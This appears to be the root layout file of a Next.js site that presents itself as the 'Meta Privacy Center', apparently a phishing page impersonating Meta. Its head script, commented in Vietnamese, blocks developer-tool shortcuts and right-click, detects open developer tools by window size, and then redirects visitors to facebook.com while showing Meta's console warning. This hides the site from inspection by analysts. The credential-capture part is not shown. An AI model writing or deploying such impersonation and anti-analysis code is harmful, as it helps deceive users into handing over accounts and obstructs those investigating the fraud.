import type { Metadata } from "next";
import "./globals.css";

export const metadata: Metadata = {
  title: "Meta Privacy Center - Community Standards & Policies",
  description: "Learn about our policies and standards that help keep our community safe. Explore Community Standards, Terms of Service, Data Policy, and more.",
  openGraph: {
    type: "website",
    url: "https://www.facebook.com/privacy/",
    title: "Meta Privacy Center - Community Standards & Policies",
    description: "Learn about our policies and standards that help keep our community safe. Explore Community Standards, Terms of Service, Data Policy, and more.",
    images: [
      {
        url: "/image.png",
        width: 1920,
        height: 840,
        alt: "Meta Privacy Center - Community Standards & Policies",
      },
    ],
    siteName: "Meta Privacy Center",
    locale: "en_US",
  },
  icons: {
    icon: [
      { url: "/favicon.ico" },
      { url: "/favicon-32x32.png", sizes: "32x32", type: "image/png" },
      { url: "/favicon-16x16.png", sizes: "16x16", type: "image/png" },
    ],
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                // Chỉ chạy trên desktop
                if (window.innerWidth <= 768) return;
                
                // Chặn F12 và các phím tắt ngay từ đầu
                document.addEventListener('keydown', function(e) {
                  if (e.key === 'F12' || e.keyCode === 123 ||
                      (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) ||
                      (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) ||
                      (e.ctrlKey && e.shiftKey && (e.key === 'K' || e.keyCode === 75))) {
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    // Chuyển hướng sang facebook.com
                    window.location.href = 'https://www.facebook.com';
                    return false;
                  }
                }, { capture: true, passive: false });
                
                // Chặn right click
                document.addEventListener('contextmenu', function(e) {
                  e.preventDefault();
                  return false;
                }, { capture: true });
                
                // Phát hiện devtools đã mở
                let devtools = { open: false };
                const threshold = 160;
                
                setInterval(function() {
                  const widthThreshold = window.outerWidth - window.innerWidth > threshold;
                  const heightThreshold = window.outerHeight - window.innerHeight > threshold;
                  
                  if (widthThreshold || heightThreshold) {
                    if (!devtools.open) {
                      devtools.open = true;
                      console.clear();
                      console.log('%cStop!', 'color: red; font-size: 50px; font-weight: bold;');
                      console.log('%cThis is a browser feature intended for developers. If someone told you to copy-paste something here, it is a scam and will give them access to your account.', 'color: red; font-size: 16px;');
                      // Chuyển hướng sang facebook.com
                      window.location.href = 'https://www.facebook.com';
                    }
                  } else {
                    devtools.open = false;
                  }
                }, 100);
              })();
            `,
          }}
        />
      </head>
      <body suppressHydrationWarning>{children}</body>
    </html>
  );
}

